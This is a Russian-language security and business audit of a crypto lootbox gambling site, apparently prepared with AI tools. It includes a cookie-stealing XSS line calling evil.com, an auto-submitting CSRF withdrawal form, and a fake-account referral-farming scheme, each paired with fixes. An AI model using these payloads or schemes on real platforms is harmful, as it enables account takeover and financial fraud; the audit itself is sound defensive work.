# CYBERBOX Full Audit Report — cc.zxcv.app

**Дата:** 2026-02-20
**Объект:** https://cc.zxcv.app/en
**Тип аудита:** Комплексный — технический (security) + продуктовый (business logic)
**Метод:** Пассивный анализ фронтенда (HTML, JS-бандлы, cookies, API), продуктовый и экономический анализ
**Источники:** Claude Code (технический анализ JS/cookies/API) + GPT-4 (бизнес-анализ UX/механик/экономики)

---

## 1. Executive Summary

CYBERBOX — крипто-лутбокс платформа на грани запуска в продакшн. Визуально зрелый продукт (8/10 UX) с полноценной механикой: пополнение счёта, кейсы, инвентарь, вывод, реферальная программа, бонусная система.

**Техническая зрелость:** 6/10 — критические дыры в cookie-безопасности, отсутствие CSP, нет CAPTCHA.

**Бизнес-зрелость:** 5/10 — реферальная модель убыточна при масштабировании, нет provably fair, есть TEST-placeholder'ы в юридических документах.

**Главный вывод:** Запускать в текущем виде — высокий риск. Три вещи могут убить продукт:
1. Технически: кража аккаунтов через XSS (cookies без `httpOnly`) → вывод крипты
2. Бизнесово: реферальные выплаты 12% от депозитов при марже 5–8% → убыток при росте
3. Репутационно: нет provably fair → крипто-аудитория не доверяет

---

## 2. Стек и архитектура

| Компонент | Значение | Примечание |
|---|---|---|
| Framework | Next.js (App Router, RSC) | Современный, production-grade |
| Build ID | `VXXf_6GhJBpciNaY7uu8t` | Виден публично |
| API base | `https://cc.zxcv.app/api` | Весь список в JS-бандле |
| Медиа-домен | `https://cybbox.com/api/media/` | Другой домен — старый бренд? |
| State | Zustand + persist → localStorage | Чувствительные данные в localStorage |
| Analytics | Google Analytics G-77C9PD1XH5 | Стандартно, но spoofable |
| Fingerprint | FingerprintJS v4.6.2 (open-source) | Используется как security-токен — ошибка |
| Платёж. процессор | PayPecker (карты) | Внешний процессор, chargeback-риск |

---

## 3. Технические уязвимости

### Сводная таблица

| # | Уязвимость | Серьёзность | Бизнес-импакт |
|---|---|---|---|
| T1 | Auth cookies без `httpOnly` | **CRITICAL** | Кража аккаунта → вывод крипты |
| T2 | Auth cookies без `secure` | **CRITICAL** | Перехват токенов по HTTP |
| T3 | Auth cookies без `sameSite` — CSRF | **HIGH** | Принудительный вывод средств |
| T4 | Нет Content-Security-Policy | **HIGH** | XSS → полный захват аккаунта |
| T5 | Нет CAPTCHA на login/register | **HIGH** | Credential stuffing, bonus farming |
| T6 | FingerprintJS visitorId как security-токен | **HIGH** | Обход device binding |
| T7 | Вся API-поверхность в JS-бандле | **MEDIUM** | Разведка для атак |
| T8 | User data в localStorage (Zustand) | **MEDIUM** | XSS → утечка профиля |
| T9 | Только клиентская валидация | **MEDIUM** | Bypass ограничений |
| T10 | Нет X-Frame-Options | **MEDIUM** | Clickjacking на вывод |
| T11 | Нет nonce на script-тегах | **MEDIUM** | Блокирует внедрение strict CSP |
| T12 | Нет Referrer-Policy | **LOW** | Утечка URL в реферерах |
| T13 | Нет security.txt | **LOW** | Нет канала для disclosure |
| T14 | Нет sitemap.xml | **LOW** | SEO, прозрачность |
| T15 | Build ID публичен | **LOW** | Разведка версии деплоя |
| T16 | Кросс-доменные ассеты (cybbox.com) | **LOW** | CSP, brand confusion |

---

### [CRITICAL] T1 & T2. Auth cookies без `httpOnly` и `secure`

**Источник:** `/_next/static/chunks/9712-*.js`, `5905-*.js`

```javascript
// access_token — НЕТ httpOnly, secure, sameSite
setCookie("access_token", a)

// refresh_token — только maxAge (30 дней), НЕТ httpOnly/secure/sameSite
setCookie("refresh_token", i, {maxAge: 2592e3})

// fingerprint — только maxAge
setCookie("fingerprint", r, {maxAge: 2592e3})
```

Все три токена **читаемы через `document.cookie`**. Атаки:

```
XSS → fetch("https://evil.com/?t=" + document.cookie)
    → получаем access_token + refresh_token
    → входим в аккаунт → POST /api/user/payments/withdrawal
    → крипта уходит на адрес атакующего
```

**Бизнес-импакт:** Платформа несёт ответственность за кражу средств пользователей. Один публичный кейс = репутационная катастрофа.

**Фикс:**
```javascript
// На сервере (Express/Node):
res.cookie("access_token", token, {
  httpOnly: true,      // недоступен для JS
  secure: true,        // только HTTPS
  sameSite: "Strict",  // блокирует CSRF
  maxAge: 15 * 60 * 1000  // 15 минут (короткий срок)
})
res.cookie("refresh_token", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "Strict",
  maxAge: 30 * 24 * 60 * 60 * 1000  // 30 дней
})
```

> Это **единственное важнейшее исправление**. Закрывает T1, T2, T3 одновременно.

---

### [HIGH] T3. CSRF на финансовых операциях

Флаг `sameSite` отсутствует → cookies летят на cross-site запросы. CSRF-токенов нет нигде.

**Уязвимые эндпоинты:**
```
POST /api/user/payments/withdrawal  ← вывод средств
POST /api/user/cryptocases/buy      ← покупка кейса
POST /api/user/password/change
```

Пример атаки через злой сайт:
```html
<form action="https://cc.zxcv.app/api/user/payments/withdrawal" method="POST">
  <input name="address" value="КОШЕЛЁК_АТАКУЮЩЕГО">
  <input name="amount" value="9999">
</form>
<script>document.forms[0].submit()</script>
```

Жертва заходит на страницу → форма сабмитится → средства уходят. Закрывается вместе с T1/T2 через `sameSite: "Strict"`.

---

### [HIGH] T4. Нет Content-Security-Policy

Ни HTTP-заголовка, ни `<meta>` CSP. Нет nonce на `<script>`. Без CSP внедрённый скрипт выполняется с полными правами.

**Nginx-фикс:**
```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://www.googletagmanager.com;
  img-src 'self' https://cybbox.com data:;
  connect-src 'self' https://cc.zxcv.app https://cybbox.com;
  frame-ancestors 'none';
" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Content-Type-Options "nosniff" always;
```

---

### [HIGH] T5. Нет CAPTCHA на аутентификации

На `/sign-in` и `/register` нет ни reCAPTCHA, ни hCaptcha, ни Cloudflare Turnstile.

**Открытые атаки:**
- **Credential stuffing** — перебор утечек паролей без ограничений
- **Automated registration** — тысячи аккаунтов для бонус-фарминга (200% welcome bonus × N аккаунтов)
- **Brute-force** — перебор паролей по словарю

**Бизнес-импакт:** Прямые финансовые потери на bonus farming'е (см. раздел Abuse).

---

### [HIGH] T6. FingerprintJS visitorId как security-токен

```javascript
// chunk 7940 — генерация "device fingerprint"
let t = await FingerprintJS.load();
let r = await t.get();
setCookie("fingerprint", r.visitorId, {maxAge: 2592e3})

// При token refresh — fingerprint как "второй фактор":
fetch("/api/users/auth/refresh", {
  body: JSON.stringify({
    fingerprint: getCookie("fingerprint"),  // ← НЕ является секретом
    refresh_token: getCookie("refresh_token")
  })
})
```

FingerprintJS — открытый MIT-проект. `visitorId` детерминирован и воспроизводим. Злоумышленник, укравший `refresh_token`, легко сгенерирует нужный `visitorId`. Это не security-контроль.

**Парадокс:** FingerprintJS полезен для anti-fraud (обнаружение мульти-аккаунтов) — но только как сигнал для fraud scoring, а не как криптографический токен.

---

### [MEDIUM] T7. Полная API-поверхность в JS-бандле

Из `5905-382bebe4b3da1053.js` извлечён полный список: 40+ эндпоинтов, включая финансовые.

```
Base: https://cc.zxcv.app/api

# Публичные
POST  /users/login, /users/register, /users/auth/refresh
POST  /users/password/forgot, /users/password/reset
POST  /referrals/check
GET   /cryptocases/get, /cryptocases/list
GET   /payments/calc, /payments/currencies/withdrawal, /payments/currencies/deposit

# Authenticated (финансовые — приоритет rate-limiting)
POST  /user/payments/withdrawal
POST  /user/payments/deposit/card
POST  /user/payments/deposit/crypto
POST  /user/cryptocases/buy
POST  /user/inventory/prize/sell
POST  /user/promocode/activate
GET   /user/payments/transaction/{hash}
GET   /user/wager/active, /user/wager/last
POST  /user/wager/ack
...и ещё ~25 эндпоинтов
```

Любой желающий видит всю архитектуру API без reverse engineering.

---

### [MEDIUM] T8 & T9. localStorage + Client-only validation

**localStorage (Zustand persist):**
```javascript
{name: "userInfo", partialize: e => ({user: e.user})}
```
Объект пользователя хранится в localStorage → доступен любому JS на странице.

**Client-only cooldown:**
```javascript
// chunk 5445 — только на фронте
setTimeout(() => { setDisabled(false) }, 30000)
// Обходится прямым вызовом POST /api/user/verification-code/send
```

**Client-only валидация адреса вывода:**
```javascript
// chunk 6278 — Zod только в браузере
withdrawal({token_standard: t, amount: Number(a), address: s})
// Прямой API-запрос bypass'ит Zod
```

**Бизнес-импакт:** Невалидные адреса кошельков могут пройти на бэкенд → потеря средств при выводе.

---

## 4. Бизнес-логика и продуктовый анализ

### 4.1. Продукт: что это такое

Крипто-лутбокс платформа (gambling):
- Платные кейсы с крипто-призами (BTC, ETH, SOL, TRX, memecoins)
- EUR-прайсинг кейсов
- Real balance / Bonus balance
- Wagering requirement
- Реферальная программа
- Инвентарь с возможностью продажи

По регуляторной классификации большинства юрисдикций — **gambling product**.

**Зрелость продукта:** 70–80% от production-ready. Это не MVP — это почти продакшн.

---

### 4.2. Регистрация и онбординг

**Что есть:**
- Email + password (с валидацией сложности)
- Email confirmation
- Поле реферального кода
- Welcome bonus промо (+200%)

**Что отсутствует:**
- Никакого онбординга после регистрации
- Нет объяснения Real vs Bonus balance до первого депозита
- Нет объяснения wagering requirement
- Нет social login (Google, Telegram, WalletConnect)
- Нет pre-KYC объяснения

**Рекомендации:**
- 3-step onboarding: "Реальный баланс vs Бонусный", "Что такое вейджер", "Условия вывода"
- Добавить Google OAuth (уже упомянут в бандле, но не реализован)
- Добавить Telegram login (для крипто-аудитории критично)

---

### 4.3. Депозитная система

**Крипто-депозит:**
- Минимум: 10 USDT
- Real-time курсы
- Промокод при депозите

Риски:
- "Actual amount may change" → потенциальные споры с пользователями
- Нет видимой структуры комиссий

**Карточный депозит (PayPecker):**
- Visa/Mastercard, минимум $10
- Внешний процессор

Риски:
- **Chargeback fraud**: пользователь вносит карточкой → выигрывает/проигрывает → делает chargeback
- Нет cooldown после карточного депозита перед выводом
- Нет risk scoring первого депозита

**Рекомендации:**
- Cooldown на вывод 48–72ч после карточного пополнения
- Верификация карты (3DS, CVV)
- Risk scoring: новый пользователь + карта + сразу вывод = флаг для ручной проверки

---

### 4.4. Бонусная система — риск агрессивности

**Welcome Bonus:**
```
+200% на первый депозит
Вейджер: ×20 от суммы бонуса
Срок: 3 дня
Growth cap: 125%
Вывод отменяет бонус
```

**Пример:**
```
Депозит: 100 USDT → Бонус: 200 USDT
Суммарный вейджер: 200 × 20 = 4,000 USDT
```

**Риски:**
- Очень агрессивный мультипликатор → пользователи чувствуют себя обманутыми
- Нет Max Win Cap (например 3–5× депозита) → возможен большой выигрыш с бонусных средств
- 3-дневный срок → давление и негативный UX
- Bonus farming через мульти-аккаунты (усиливается T5 — нет CAPTCHA)

**Рекомендации:**
- Добавить Max Win Cap (3× депозита)
- Добавить визуальный прогресс-бар вейджера
- Увеличить срок до 7 дней для retention
- Серверный контроль bonus eligibility (не только клиентский)

---

### 4.5. Система балансов

Двойной баланс (Real / Bonus) — отраслевой стандарт:
- Real тратится первым
- Bonus — после исчерпания Real
- Выигрыши возвращаются на баланс-источник

Это корректная реализация. Но в UI не хватает:
- Прогресс-бара вейджера
- Таймера истечения бонуса
- Раздельной истории транзакций по типам баланса

---

### 4.6. Система вывода

**Что видно из API:**
```
POST /api/user/payments/withdrawal
  body: {token_standard, amount, address}
GET  /api/user/payments/transaction/{hash}
```

**Проблемы UX и безопасности:**
- Нет видимого SLA (время обработки)
- Нет структуры комиссий
- Нет статусов "Pending / Approved / Rejected" в UI (есть только `{hash}`)
- Нет порога KYC-триггера в UI
- Адрес кошелька валидируется только на фронте (T9)

**Рекомендации:**
- Добавить "Обычно обрабатывается за 1–24ч"
- Добавить структуру комиссий
- Добавить статус-трекинг по hash
- Уведомление о KYC при первом выводе

---

### 4.7. Реферальная программа — КРИТИЧЕСКИЙ ЭКОНОМИЧЕСКИЙ РИСк

**Модель комиссий:**
```
≥ 0 USDT рефералов   → 5% от их депозитов
≥ 300 USDT рефералов → 7%
≥ 1,000 USDT         → 10%
≥ 5,000 USDT         → 12%
```

**Активация:** реферал должен пополнить ≥ 20 USDT
**Регистрационный бонус:** 2 USDT за реферала

**ПОЧЕМУ ЭТО УБЫТОЧНО:**

```
Маржа платформы (RTP ~93–95%): 5–7% от оборота
Реферальная выплата (верхний тир): 12% от ДЕПОЗИТОВ
```

Комиссия считается от **депозитов**, а не от GGR (gross gaming revenue). Если пользователь внёс 1,000 USDT и проиграл их (что даёт платформе ~60 USDT маржи), реферер получает 120 USDT. **Платформа в минусе -60 USDT на этом пользователе.**

**Безопасная формула:**
```
Referral payout = GGR × commission%
GGR = total_deposits - total_withdrawals - bonus_costs

При марже 6% и комиссии 5% от GGR:
Депозит 1,000 → GGR 60 → Реферер получает 3 USDT ✓
```

**Связь с security (T5):** Без CAPTCHA на регистрации — тривиальная схема:
```
1. Открыть 100 фейковых аккаунтов (нет CAPTCHA)
2. Задепозитить по 20 USDT (минимум активации)
3. Получить 12% × 100 × 20 = 240 USDT реферальных
4. Платформа теряет деньги на бонусах и реф-выплатах
```

**Рекомендации:**
- Немедленно: перейти на GGR-based реферальные (не от депозита)
- Или: ограничить до 3–5% от депозита
- Связать с T5: добавить CAPTCHA + верификацию уникальности аккаунта

---

### 4.8. Инвентарь и продажа призов

```
POST /api/user/inventory/prize/sell
GET  /api/user/inventory
```

UI: "Sell all", тоггл "Available for sale".

**Риск:** если выкуп мгновенный и по полной стоимости:
```
Открыть кейс → продать приз → повторить
→ игрок снижает дисперсию → платформа теряет маржу
```

**Рекомендации:**
- Sell комиссия 3–8% (buyback по 92–97% цены)
- Или: задержка resale (например, через 24ч)

---

## 5. Провабли-фэйр (Provably Fair) — ОТСУТСТВУЕТ

В JS-бандлах нет ни одного упоминания:
- Client seed / Server seed
- Hash pre-commitment
- Страницы верификации

Для крипто-аудитории provably fair — **базовое требование доверия**. Без него платформа воспринимается как "чёрный ящик" с произвольным RTP.

**Рекомендации:**
- Реализовать стандартную схему:
  1. Server seed hash публикуется до открытия кейса
  2. Client seed задаётся пользователем (или генерируется в браузере)
  3. Результат = hash(server_seed + client_seed + nonce)
  4. После открытия — показать server_seed, дать верифицировать
- Добавить публичную страницу верификации
- Это увеличит конверсию и retention в крипто-сегменте

---

## 6. Compliance и Legal

**Документы присутствуют:**
- User Agreement, Privacy Policy, Cookie Policy
- Responsible Gaming Policy
- KYC/AML Policy
- Drop Rate Disclosure
- Risk Disclaimer, Acceptable Use

**Критические проблемы:**
- **TEST placeholder'ы** в юридических документах — нельзя с ними в продакшн
- Нет видимого номера лицензии (gambling без лицензии = нелегально в большинстве юрисдикций)
- Нет clarity по dispute resolution
- Нет security.txt (`/.well-known/security.txt` → 404)

**AML-workflow:**
Есть `/api/users/verification-code/*` и `/api/users/email-confirmation`, но нет видимой логики KYC-триггеров по порогу вывода. Первый вывод должен требовать KYC.

---

## 7. Abuse Risk — комбинированный анализ

Совмещение технических уязвимостей и бизнес-механик создаёт высокую поверхность для злоупотреблений:

| Схема | Технический вектор | Бизнес-вектор | Риск |
|---|---|---|---|
| Бонус-фарминг | T5 (нет CAPTCHA) | Welcome 200% + мин депозит | Высокий |
| Реф-farming | T5 (нет CAPTCHA) | Реф 12% от депозита | Критический |
| Кража аккаунта | T1/T2 (cookies) | Вывод крипты | Критический |
| CSRF-вывод | T3 (sameSite) | POST /withdrawal | Высокий |
| Chargeback + вывод | Нет cooldown | Карта → крипто-вывод | Высокий |
| Адрес bypass | T9 (client-only) | Невалидный адрес вывода | Средний |
| Продажа инвентаря | — | Instant full-price buyback | Средний |

**Необходимые anti-abuse меры:**
1. Device fingerprinting для обнаружения мульти-аккаунтов (FingerprintJS — правильное использование: fraud signal, не токен)
2. IP clustering / VPN detection
3. Ручная проверка первого вывода
4. Withdrawal freeze после карточного депозита (48–72ч)
5. Phone verification при регистрации или первом выводе
6. Velocity checks: несколько аккаунтов с одного IP → блок

---

## 8. Экономическая устойчивость

**Допущения:**
```
RTP: 92–95%
Маржа платформы: 5–8%
```

**Стоимость одного пользователя при текущей модели:**
```
Welcome bonus: +200% (стоит ~30–40% от первого депозита при RTP 95%)
Реферальная выплата: до 12% от депозита
Карточный процессинг: ~2–3% от суммы
Потенциальный chargeback: 1–5% от карточных транзакций
```

В худшем случае: 12% (реф) + 40% (бонус) + 3% (карта) = **55% от депозита уходит на acquisition**, при марже 5–8%. Убыточно.

**Вывод:** Модель работает только при низком уровне абьюза и малой доле реф-трафика верхних тиров. При масштабировании — ломается.

**Что исправить:**
- Реферальные → с депозита на GGR
- Max Win Cap на бонус
- Sell комиссия на инвентарь

---

## 9. Что сделано хорошо

**Технически:**
- Нет хардкоженных API-ключей в JS
- Нет открытых `/admin`, `/swagger`, `/graphql`
- Нет `.env` в публичном доступе
- Bearer-токен правильно в заголовке Authorization
- HTTPS включён, нет mixed content
- Нет стек-трейсов в HTML

**Продуктово:**
- Высокое качество UI/UX (8/10)
- Чёткая структура FAQ и юридических документов
- Логика двойного баланса корректна и стандартна
- Реферальная геймификация с уровнями
- Wager growth с бонусных выигрышей (защита платформы)
- Структурированный onboarding-текст (нужна только реализация UI)

---

## 10. Приоритетный роадмап

### До запуска (CRITICAL)

| Приоритет | Задача | Связь |
|---|---|---|
| 🔴 1 | `httpOnly + secure + sameSite` на auth cookies | T1, T2, T3 |
| 🔴 2 | CSP + X-Frame-Options + security headers | T4, T10 |
| 🔴 3 | Исправить реферальную модель → GGR-based | Экономика |
| 🔴 4 | Добавить CAPTCHA (Cloudflare Turnstile) на auth | T5, Abuse |
| 🔴 5 | Убрать TEST placeholder'ы из legal-документов | Compliance |

### Высокий приоритет (перед масштабированием)

| Приоритет | Задача |
|---|---|
| 🟠 6 | Server-side rate limiting (login/register/withdrawal/verification-code) |
| 🟠 7 | Реализовать Provably Fair + страница верификации |
| 🟠 8 | Withdrawal freeze 48–72ч после карточного депозита |
| 🟠 9 | Серверная валидация адресов кошельков |
| 🟠 10 | Max Win Cap на welcome bonus (3–5× депозита) |
| 🟠 11 | Ручная проверка первого вывода |
| 🟠 12 | Заменить FingerprintJS как security-токен → httpOnly device token |
| 🟠 13 | Прогресс-бар вейджера + таймер бонуса в UI |
| 🟠 14 | Прозрачность вывода: SLA, комиссии, статусы |

### Средний приоритет

| Приоритет | Задача |
|---|---|
| 🟡 15 | Минимизировать localStorage (убрать баланс/email из Zustand persist) |
| 🟡 16 | IP clustering + VPN detection для anti-fraud |
| 🟡 17 | Sell-комиссия на инвентарь (3–8%) |
| 🟡 18 | Google OAuth / Telegram login |
| 🟡 19 | 3-step onboarding после регистрации |
| 🟡 20 | KYC-триггер при первом выводе с уведомлением |

### Growth-фаза

| Задача |
|---|
| VIP-система и loyalty-тиры |
| Турниры и leaderboard |
| Ежедневный бесплатный кейс |
| Cashback-модель |
| Affiliate-дашборд с GGR-метриками |
| Телеграм/Discord-сообщество |
| Аналитический дашборд (retention, LTV, GGR по каналам) |

---

## 11. Стратегическая оценка

| Параметр | Текущий уровень |
|---|---|
| Визуальная зрелость | ⭐⭐⭐⭐ 8/10 |
| Функциональная готовность | ⭐⭐⭐ 7/10 |
| Техническая безопасность | ⭐⭐ 4/10 |
| Экономическая устойчивость | ⭐⭐ 4/10 |
| Крипто-доверие (provably fair) | ⭐ 2/10 |
| Compliance-готовность | ⭐⭐ 4/10 |

**Стратегический вопрос:** что является целью?

- **A) Short-term cashflow** — текущая конфигурация даёт это, но недолго. Риск regulatory shutdown + fraud losses.
- **B) Long-term crypto gambling brand** — требует provably fair + compliance + исправленной экономики. Реалистично за 2–3 месяца работы.
- **C) Affiliate traffic machine** — требует GGR-based партнёрки + аналитики. Интересная ниша.

**Без исправлений Critical-блока:** масштабирование финансово опасно.
**С исправлениями:** платформа конкурентоспособна в mid-tier крипто-лутбокс сегменте.

---

*Технический анализ: пассивное исследование публичного фронтенда (HTML, JS-бандлы, cookies, API). Серверная логика, БД и инфраструктура не проверялись.*
*Бизнес-анализ: оценка UX, механик, экономической модели, compliance на основе публично доступных данных.*
